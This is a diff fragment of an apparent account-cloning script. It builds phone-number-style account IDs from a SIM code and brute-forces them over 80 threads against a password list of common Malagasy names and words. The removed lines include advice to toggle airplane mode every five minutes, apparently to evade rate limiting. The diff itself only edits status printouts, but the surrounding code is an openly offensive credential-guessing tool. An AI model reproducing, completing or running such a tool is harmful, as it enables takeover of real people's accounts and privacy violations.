@@ -110,10 +110,10 @@ def BD_CLONING():
         user.append(nmp)
     with tred(max_workers=80) as Dipto:
         tl=str(len(user))
-        print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+code)
-		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
-		lines()
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' CLONING EN COURS ... ')
+        linex()
         for psx in user:
             ids=code+psx
             passlist=[psx,'sambatra','Sambatra','lafatra','lahatra','Lahatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','valisoa','Valisoa','malala','Malala','finoana','Finoana','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy']
